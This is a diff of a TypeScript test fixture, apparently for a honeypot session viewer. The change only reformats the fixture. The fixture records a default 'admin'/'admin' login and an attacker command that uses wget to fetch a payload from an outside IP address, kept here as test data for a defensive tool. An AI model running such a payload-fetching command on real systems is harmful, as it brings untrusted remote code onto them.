@@ -16,10 +16,21 @@ function session(over: Partial<SessionDetailResponse> = {}): SessionDetailRespon
     started_at: '2026-05-31T13:40:52+00:00',
     ended_at: '2026-05-31T13:41:50+00:00',
     auth_attempts: [
-      { id: 1, username: 'admin', password: 'admin', success: true, timestamp: '2026-05-31T13:41:38+00:00' },
+      {
+        id: 1,
+        username: 'admin',
+        password: 'admin',
+        success: true,
+        timestamp: '2026-05-31T13:41:38+00:00',
+      },
     ],
     commands: [
-      { id: 10, input: 'wget http://34.11.136.102/x', success: true, timestamp: '2026-05-31T13:41:49+00:00' },
+      {
+        id: 10,
+        input: 'wget http://34.11.136.102/x',
+        success: true,
+        timestamp: '2026-05-31T13:41:49+00:00',
+      },
     ],
     downloads: [],
     ...over,
